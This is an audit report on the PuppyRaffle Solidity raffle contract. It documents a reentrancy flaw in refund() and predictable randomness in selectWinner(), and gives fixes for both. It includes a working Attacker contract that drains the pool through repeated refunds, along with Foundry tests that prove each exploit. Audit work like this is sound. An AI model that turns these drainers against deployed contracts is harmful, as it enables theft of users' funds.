# 4 puppy raffle audit - Findings Report
## Commit hash: 15c50ec22382bb1f3106aba660e7c590df18dcac

## Protocol Overview 

**Puppy Raffle Protocol**

PuppyRaffle is a self-contained Ethereum raffle that awards a randomly generated Puppy NFT and an ether prize.  
• **Entry:** Anyone calls `enterRaffle(address[] players)` paying `entranceFee` for each address. The contract rejects duplicate addresses and emits `RaffleEnter` for transparency.  
• **Refunds:** Before the draw, a player may call `refund(index)` to reclaim their fee; only the caller’s own index is accepted.  
• **Lifecycle:** A raffle starts on deployment and runs for `raffleDuration` seconds. When the timer expires and ≥4 active players exist, anyone may invoke `selectWinner()`.  
• **Winner Selection:** A pseudo-random index (using block data) is chosen, `previousWinner` is recorded, an NFT is minted, and funds are distributed: 80 % of the pot to the winner, 20 % to `feeAddress`. State is then reset for the next round.  
• **Protocol Fees:** Collected fees accumulate in `totalFees`. The owner can `withdrawFees()` (only when no active players) or change the `feeAddress`.  
• **Metadata:** NFTs store rarity and image URIs entirely on-chain via `tokenURI`.  
Overall, PuppyRaffle provides a low-friction, transparent lottery with built-in refunds, fee sharing, and perpetual rounds—all in <200 lines of Solidity.
## Critical Risk Findings
[C-1]. Reentrancy issue in PuppyRaffle::refund
## High Risk Findings
[H-1]. Randomness issue in PuppyRaffle::selectWinner


### Number of Findings
- C: 1
- H: 1
- M: 0
- L: 0
- I: 0



# Critical Risk Findings

## [C-1]. Reentrancy issue in PuppyRaffle::refund

## Description
The `refund` function follows the 'calls before state updates' pattern, a violation of the Checks-Effects-Interactions (CEI) principle. It transfers the `entranceFee` back to the player using `sendValue` (which uses a low-level `.call`) before updating the `players` array to nullify the player's entry. A malicious contract can exploit this by re-entering the `refund` function from its `receive()` or `fallback()` function. Each re-entrant call will pass the initial checks because the player's state has not been updated, allowing the attacker to repeatedly withdraw the `entranceFee` until the contract's balance is drained.

## Impact
A malicious actor can create a contract to enter the raffle and then call `refund` to drain the entire prize pool, stealing all funds from other participants. This results in a total loss of funds for the raffle.

## Proof of Concept
pragma solidity 0.7.6;

/*
1. Any user (or previous rounds) leaves ETH inside PuppyRaffle. For demo we force-fund it with vm.deal().
2. Attacker buys ONE raffle ticket.
3. During the first refund() call the contract sends the ticket price before it marks the player as refunded.
4. The attacker re-enters refund() from its receive() function as long as the raffle still owns >= entranceFee wei.
5. Each nested call passes the same "playerIndex" check because the array slot is not zeroed yet.
6. The loop stops only when the contract balance becomes < entranceFee, effectively draining every wei that belonged to honest players.
*/
contract Attacker {
    PuppyRaffle public raffle;
    uint256 public reentered;

    constructor(PuppyRaffle _raffle) {
        raffle = _raffle;
    }

    function attack() external payable {
        // Buy exactly one ticket
        address[] memory players = new address[](1);
        players[0] = address(this);
        raffle.enterRaffle{value: raffle.entranceFee()}(players);

        uint256 idx = raffle.getActivePlayerIndex(address(this));
        raffle.refund(idx); // first refund – starts the re-entrancy cascade
    }

    receive() external payable {
        if (address(raffle).balance >= raffle.entranceFee()) {
            reentered++;
            uint256 idx = raffle.getActivePlayerIndex(address(this));
            raffle.refund(idx);
        }
    }
}


## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity 0.7.6;

import "forge-std/Test.sol";
import {PuppyRaffle} from "../src/PuppyRaffle.sol";

contract ReentrancyRefundTest is Test {
    PuppyRaffle raffle;
    Attacker attacker;

    uint256 constant ENTRANCE_FEE = 0.1 ether;

    function setUp() public {
        raffle = new PuppyRaffle(ENTRANCE_FEE, address(0xBEEF), 1 days);

        // Pretend other players already deposited 5 ether
        vm.deal(address(raffle), 5 ether);

        attacker = new Attacker(raffle);
        vm.deal(address(attacker), 1 ether);
    }

    function testDrainViaReentrancy() public {
        uint256 balanceBefore = address(raffle).balance;

        vm.startPrank(address(attacker));
        attacker.attack{value: ENTRANCE_FEE}();
        vm.stopPrank();

        uint256 balanceAfter = address(raffle).balance;
        uint256 attackerProfit = address(attacker).balance - (1 ether - ENTRANCE_FEE); // subtract ticket cost

        assertEq(balanceAfter, 0, "raffle should be emptied");
        assertEq(attackerProfit, balanceBefore, "attacker stole the whole pool");
        assertTrue(attacker.reentered() > 0, "re-entrancy occurred");
    }
}

// Minimal attacker from PoC
contract Attacker {
    PuppyRaffle public raffle;
    uint256 public reentered;

    constructor(PuppyRaffle _raffle) {
        raffle = _raffle;
    }

    function attack() external payable {
        address[] memory players = new address[](1);
        players[0] = address(this);
        raffle.enterRaffle{value: raffle.entranceFee()}(players);
        uint256 idx = raffle.getActivePlayerIndex(address(this));
        raffle.refund(idx);
    }

    receive() external payable {
        if (address(raffle).balance >= raffle.entranceFee()) {
            reentered++;
            uint256 idx = raffle.getActivePlayerIndex(address(this));
            raffle.refund(idx);
        }
    }
}

## Suggested Mitigation
Move `players[playerIndex] = address(0);` to *before* the ETH transfer and/or add `ReentrancyGuard` to the contract so that refund() is protected with the `nonReentrant` modifier. Both changes guarantee that a re-entrant refund() call will fail the `playerAddress != address(0)` check, fully eliminating the vulnerability.



# High Risk Findings

## [H-1]. Randomness issue in PuppyRaffle::selectWinner

## Description
The `selectWinner` function uses a combination of `msg.sender`, `block.timestamp`, and `block.difficulty` (now `prevrandao`) to generate pseudo-random numbers for selecting a winner and determining NFT rarity. These on-chain variables are predictable and can be manipulated by block producers (miners/validators). A malicious miner who is also a participant in the raffle can repeatedly compute the outcome off-chain and choose to include a call to `selectWinner` only in a block where they are the winner. This allows them to guarantee they win the prize pool and potentially mint the rarest NFT.

## Impact
The integrity of the raffle is compromised. A malicious miner can guarantee they win every raffle, effectively stealing the prize pool from legitimate participants. This destroys the contract's core purpose of being a fair raffle.

## Proof of Concept
1. A miner participates in the raffle by calling `enterRaffle`.
2. The miner waits for the `raffleDuration` to pass.
3. The miner generates a transaction to call `selectWinner` but does not broadcast it.
4. When creating a new block, the miner can calculate the `winnerIndex` using their address as `msg.sender` and the current block's `timestamp` and `difficulty`.
5. If the calculated `winnerIndex` corresponds to their own entry, they include the `selectWinner` transaction in the block they are producing.
6. If they are not the winner, they simply omit the transaction and try again in the next block they produce.
7. This process can be repeated until they win, guaranteeing them the prize.

## Proof of Code
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.7.6;

import {Test} from "forge-std/Test.sol";
import {PuppyRaffle} from "../src/PuppyRaffle.sol";

contract RandomnessTest is Test {
    PuppyRaffle puppyRaffle;
    uint256 entranceFee = 0.1 ether;
    address feeAddress = makeAddr("fee");
    uint256 raffleDuration = 1 days;
    address player1 = makeAddr("player1");
    address player2 = makeAddr("player2");
    address player3 = makeAddr("player3");
    address player4 = makeAddr("player4");

    function setUp() public {
        puppyRaffle = new PuppyRaffle(entranceFee, feeAddress, raffleDuration);
        address[] memory players = new address[](4);
        players[0] = player1;
        players[1] = player2;
        players[2] = player3;
        players[3] = player4;
        puppyRaffle.enterRaffle{value: entranceFee * 4}(players);
        vm.warp(block.timestamp + raffleDuration + 1);
    }

    function test_WinnerIsPredictable() public {
        // The attacker (in this case, the test contract itself, which is the msg.sender)
        // can perfectly predict the outcome before calling the function.
        uint256 expectedWinnerIndex = uint256(keccak256(abi.encodePacked(address(this), block.timestamp, block.difficulty))) % 4;
        address expectedWinner = puppyRaffle.players(expectedWinnerIndex);

        // Call the function
        puppyRaffle.selectWinner();

        // Assert that the winner is the one we predicted
        address actualWinner = puppyRaffle.previousWinner();
        assertEq(actualWinner, expectedWinner, "Winner was not as predicted");
    }
}
```

## Suggested Mitigation
Do not use on-chain data for randomness. The recommended solution is to use a Verifiable Random Function (VRF) service like Chainlink VRF. This provides provably fair and tamper-proof randomness.

1. Inherit from `VRFConsumerBase`.
2. Request randomness from the Chainlink Coordinator in a function like `requestWinner()`.
3. The VRF Coordinator will call back a `fulfillRandomness` function in your contract with a secure random number.
4. Use this random number in a separate function, `finalizeRaffle(uint256 _randomness)`, to select the winner and mint the NFT.

This creates a two-step process that is secure against miner manipulation.



